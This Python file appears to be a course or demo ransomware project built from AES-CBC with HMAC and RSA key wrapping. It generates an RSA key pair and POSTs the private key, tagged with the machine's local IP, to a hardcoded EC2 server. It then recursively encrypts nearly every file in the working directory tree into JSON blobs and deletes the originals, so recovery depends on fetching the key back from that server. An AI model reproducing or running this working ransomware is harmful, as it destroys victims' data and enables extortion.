import json, requests, os, socket, sys, base64, cryptography
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, serialization, hashes, asymmetric as asymm, hashes, hmac
from cryptography.hazmat.primitives.asymmetric import rsa

class FileEncryptMAC:

    #--- Part 1: (C, IV, tag)= MyencryptMAC(message, EncKey, HMACKey) ---

    # encryption method AES-CBC-256, Encrypt-then-MAC(SHA256)
    def MyencryptMAC(self, message, EncKey, HMACKey):

        #--- STEP 1: Encrypt ---

        #check key length
        if len(EncKey)<32 or len(HMACKey)<32:
            print("Error: key lengthis less than 32 bytes.")
            return

        # convert message to bytes. Pass if message is already bytes type.
        try:
            message = message.encode()#convert string to bytes
        except:
            pass

        # encrypt a message
        try:
            IV = os.urandom(16)   #generate an Initialization vector

            # pad the message
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(message) + padder.finalize()
            message = padded_data

            #calling the default AES CBC mode
            cipher = Cipher(algorithms.AES(EncKey), modes.CBC(IV), backend=default_backend())
            #creating an encryptor object
            encryptor = cipher.encryptor()
            #generating cipher text
            C = encryptor.update(message) + encryptor.finalize()

            print("Success: Encryption finished.")
        except:
            print("Error: Encryption failed.")
            return


        #--- STEP 2: HMAC ---
        try:
            # create a tag
            tag = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
            tag.update(C)
            tag = tag.finalize()

            print("Success: HMAC tag finished.")
            print("MyencryptMAC complete.")
            return(C, IV, tag)
        except:
            print("Error: HMAC tag failed.")
            return



    # MACVerification-then-Decrypt
    def MydecryptMAC(self, C, IV, tag, EncKey, HMACKey):

        #Step 1: Verify
        # create HMAC_tag
        h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend())
        h.update(C)
        h = h.finalize()

        # compare HMAC_tag with tag belongs to encrypted content
        if h == tag:
            print("Success: Tag verified.")
            cipher = Cipher(algorithms.AES(EncKey), modes.CBC(IV), backend=default_backend())
            #creating a decryptor object
            decryptor = cipher.decryptor()
            plaintext = decryptor.update(C) + decryptor.finalize()

            try:
                #unpad the plaintext
                unpadder = padding.PKCS7(128).unpadder()
                pt = unpadder.update(plaintext) + unpadder.finalize()
                print("MydecryptMAC Complete.")
                return plaintext
            except:
                #plaintext does not require unpadding
                print("MydecryptMAC Complete.")
                return plaintext

        else:
            print("Error: Tag verified failed.")
            return


    #--- Part 2: (C, IV, tag, Enckey, HMACKey, ext)= MyfileEncryptMAC(filepath) ---
    def MyfileEncryptMAC(self, filepath):

        try:
            #generate keys
            EncKey = os.urandom(32)
            HMACKey = os.urandom(32)
        except:
            print("NameError: name 'os' is not defined")
            return

        try:
            # Read the entire file as a single byte string
            with open(filepath, 'rb') as f:
                data = f.read()
        except:
            print("Error: filepath is invalid.")
            return

        try:
            try:
                result = self.MyencryptMAC(data, EncKey, HMACKey)
                print("Success: Encrypted file with a tag.")
            except:
                print("Error: MyencryptMAC failed.")
                return

            ext = os.path.splitext(filepath)[1]
            filename = os.path.basename(filepath)
            enc_filename = os.path.splitext(filename)[0] + ".encrypted" + ext

            result += (EncKey, HMACKey, ext)
            return result
        except:
            print("Error: MyfileEncryptMAC failed.\n")
            return


    # file dencryption algorithm
    def MyfileDecryptMAC(self, enc_filepath, C, iv, tag, key, h, ext):
        # cipher text as bytes
        data = C

        try:
            plaintext = self.MydecryptMAC(data, iv, tag, key, h)
            print("Success: Decrypted file with a tag.")

            dec_file_path = os.path.abspath(enc_filepath)
            a = os.path.basename(dec_file_path)
            c = os.path.splitext(a)
            d = os.path.splitext(c[0])
            dec_file_name = d[0]+ext
            dec_file_path = os.path.join(os.path.dirname(dec_file_path),dec_file_name)

            image_result = open(dec_file_path, 'wb') # create a writable image and write the decoding result
            image_result.write(plaintext)
            print("Complete: Decrypted file located in \"{}\".\n".format(dec_file_path))

        except:
            print("Error: MydecryptMAC failed.")


    #--- Part 3:  (RSACipher, C, IV, tag, ext)= MyRSAEncrypt(filepath, RSA_Publickey_filepath) ---
    
    #create public/private key pair
    def create_pem_key_pair(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
            local_ip_address = s.getsockname()[0]
#             hostname = socket.gethostname()
        except:
            print("Error: Obtain IP address and hostname failed.")

        # create key object
        backend = default_backend()
        key = rsa.generate_private_key(backend=backend, public_exponent=65537,key_size=2048)

        # private key
        private_key_name = "private.pem"
        private_key = key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
                )

        try:
            # POST private key to server
            rprivate = requests.post('http://ec2-13-58-22-230.us-east-2.compute.amazonaws.com:3000/tasks', 
                      data={'ip': local_ip_address, 'name': private_key_name, 'value': private_key})
            print(rprivate.status_code, rprivate.reason, " ---> private.pem POST request has succeeded.")
        except:
            print("Error: POST private key failed.")

        # create a directory to store PEM public key locally
        newpath = os.path.abspath("key")
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        #public key
        public_key_path = os.path.join("key", "public.pem")
        public_key = key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
                )

    #     # POST public key to server
    #     rpublic = requests.post('http://localhost:3000/tasks/', 
    #                   data={'name': , 'value': public_key})
    #     print(rpublic.status_code, rpublic.reason, " ---> public.pem POST request has succeeded.")

        try:
            # keep public key locally
            with open(public_key_path, 'wb') as public_pem:
                public_pem.write(public_key)
                public_pem.close()

            print("Success: POST \"public.pem\" and \"private.pem\" to the server complete.")
        except:
            print("Error: Create public key failed.")
        
    def fetch_pem_key(self):
        # create or look for a directory to store PEM private key
        newpath = os.path.abspath("key")
        if not os.path.exists(newpath):
            os.makedirs(newpath)

        try:
            url = 'http://ec2-13-58-22-230.us-east-2.compute.amazonaws.com:3000/tasks'
            resp = requests.get(url=url)
            data = json.loads(resp.text)
        except:
            print("Error: API request failed.")
            return

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
            local_ip_address = s.getsockname()[0]
        except:
            print("Error: Obtain IP address and hostname failed.")
            return

        try:
            for item_dict in data:    
                # traverse through the dictionary to obtain key,value
                if item_dict['ip'] == local_ip_address:  
                    for key, value in item_dict.items():
                            if key == "name":
                                filename = value
                            if key == "value":
                                pem_data = value
        except:
            print("Error: Unable to find private key correspond to the ip address.")
            return

        filepath = os.path.abspath(os.path.join("key",filename))

        try:
            #create pem key from 
            with open(filepath,"a+") as f:
                f.write(pem_data)
        except:
            print("Error: Unable to write .pem file.")

    
    
    def load_public_key(self):
        for root, dirs, files in os.walk("."):
            for file in files:
                if file.endswith(".pem"):
                    if file == "public.pem":
                        publicKey_path = os.path.abspath(os.path.join(root, file))
                        return publicKey_path
    
    def load_private_key(self):
        for root, dirs, files in os.walk("."):
            for file in files:
                if file.endswith(".pem"):
                    if file == "private.pem":
                        private_key_path = os.path.abspath(os.path.join(root, file))
                        return private_key_path

    #RSA encryption method
    def MyRSAEncryptMAC(self, file_path, RSA_Publickey_filepath):
        #encrypting an image file
        print("MyfileEncryptMAC...running")
        try:
            C, IV, tag, Enckey, HMACKey, ext = self.MyfileEncryptMAC(file_path)
        except:
            print("Error: MyfileEncryptMAC failed.\n")
            return

        try:
            with open(RSA_Publickey_filepath, "rb") as p_key:
                public_key = serialization.load_pem_public_key(p_key.read(),backend=default_backend())
        except:
            print("Error: Pem Public key's filepath is invalid.")
            return

        #obtain RSACipher
        try:
            RSACipher = public_key.encrypt(Enckey + "thisisabreakpoint".encode() +HMACKey, asymm.padding.OAEP(
                                                   mgf=asymm.padding.MGF1(algorithm=hashes.SHA256()),
                                                   algorithm=hashes.SHA256(),
                                                   label=None ))
        except:
            print("Error: RSACipher cannot be generated.")
            return

        return RSACipher, C, IV, tag, ext



    #RSA decryption method
    def MyRSADecryptMAC(self, RSACipher, enc_file_path, C, IV, tag, ext, RSA_Privatekey_filepath):

        try:
            with open(RSA_Privatekey_filepath, "rb") as Enckey:
                private_key = serialization.load_pem_private_key(Enckey.read(),password=None, backend=default_backend())
        except:
            print("Error: Pem private key's filepath is invalid.")

        try:
            key = private_key.decrypt(
                RSACipher,
                asymm.padding.OAEP(mgf=asymm.padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))

            # split the Enc_key and HMAC_key
            key_list = key.split("thisisabreakpoint".encode())
            Enckey, HMACKey = key_list[0], key_list[1]
        except:
            print("Error: Enc_key and HMAC_key cannot be generated from RSACipher.")


        print("MyfileDecryptMAC...running")
        try:
            self.MyfileDecryptMAC(enc_file_path, C, IV, tag, Enckey, HMACKey, ext)
        except:
            print("Error: MyfileDecryptMAC failed.\n")


            
            
    # -------------------------
    # Execution Functions Below
    # ------------------------


    ## 2: Encryption Function
    
    # Encryption useage
    def dir_encrypt(self):
        # step 1: key check
        try:
            public_key_path = self.load_public_key()
            if public_key_path == None:
                # generating public/private key pairs
                self.create_pem_key_pair()
                public_key_path = self.load_public_key()
        except:
            print("Error: Loadin public key failed.")
        
        # get a list of files in a directory ready for encryption
        directory = os.getcwd()
        # get only file in directory
        #files = [f for f in os.listdir(directory) if os.path.isfile(f)]

        # get all files within the directory                 
        allPath = []
        for folder, subfolders, files in os.walk(directory):
            for file in files:
                filePath = os.path.join(os.path.abspath(folder), file)
                allPath.append(filePath)
        
        # remove duplicate filepath
        allPath = list(set(allPath))
        
        # remove ".ipynb" and ".DS_Store" files
        allPath = [ x for x in allPath if ".pem" not in x
        and ".json" not in x
        and ".exe" not in x                 
#         and ".DS_Store" not in x
#         and ".md" not in x
        and ".ipynb" not in x
        and ".py" not in x
        and ".sh" not in x]
        
        for filepath in allPath:    
            try:
                RSACipher, C, IV, tag, ext = self.MyRSAEncryptMAC(filepath, public_key_path)
            except:
                print("Error: MyRSAEncryptMAC failed.")
                return

            # create JSON file with encrypted data
            try:
                data = {}
                data['RSACipher'] = RSACipher.decode('latin-1')
                data['C'] = C.decode('latin-1')
                data['IV'] = IV.decode('latin-1')
                data['tag'] = tag.decode('latin-1')
                data['ext'] = ext
            except:
                print("Error: Creating JSON object failed.")
                return

            try:
                enc_filepath = os.path.splitext(filepath)[0] + ".encrypted" + ".json"

                with open(enc_filepath, 'w') as outfile:
                    json.dump(data, outfile, indent=4)

                #remove original files
                os.remove(filepath)
                print("Complete: Create JSON file located in...\n \"{}\".\n".format(enc_filepath))
            except:
                print("Error: Creating JSON file failed.")
                return


    ## 3: Decryption Function
    # Decryption useage
    def dir_decrypt(self):

        # 1: key check
        try:
            private_key_path = self.load_private_key()
            if private_key_path == None:
                # download private key from server
                self.fetch_pem_key()
                private_key_path = self.load_private_key()
        except:
            print("Error: Loadin private key failed.")
            
      #  --- Only work with current directory, not including subdirectories ---
        # get a list of files in a directory ready for encryption
        directory = os.getcwd()
        # get only file in directory
        files = [f for f in os.listdir(directory) if os.path.isfile(f)]
        # remove ".ipynb" and ".DS_Store" files
        files = [ x for x in files if ".json" in x]
        
    # --- work with current and subdirectories ---
        allPath = []
        for folder, subfolders, files in os.walk(os.getcwd()):
            for file in files:
                filePath = os.path.join(os.path.abspath(folder), file)
                allPath.append(filePath)

        # remove duplicate filepath
        allPath = [ x for x in allPath if ".json" in x]

        for filepath in allPath:
            try:
                #opens the json file
                with open(filepath, 'r') as re:
                    json_data = json.load(re)
            except:
                print("Error: Cannot open JSON file.")
                return

            try:
                data_RSACipher = bytes(json_data["RSACipher"], 'latin-1')
                data_C = bytes(json_data["C"], 'latin-1')
                data_IV = bytes(json_data["IV"], 'latin-1')
                data_tag = bytes(json_data["tag"], 'latin-1')
                data_ext = json_data["ext"]
            except:
                print("Error: Parse JSON data failed.")
                return

            try:
                self.MyRSADecryptMAC(data_RSACipher, filepath, data_C, data_IV, data_tag, data_ext, private_key_path)
                os.remove(filepath)
            except:
                print("Error: MyRSADecryptMAC failed.")
                return
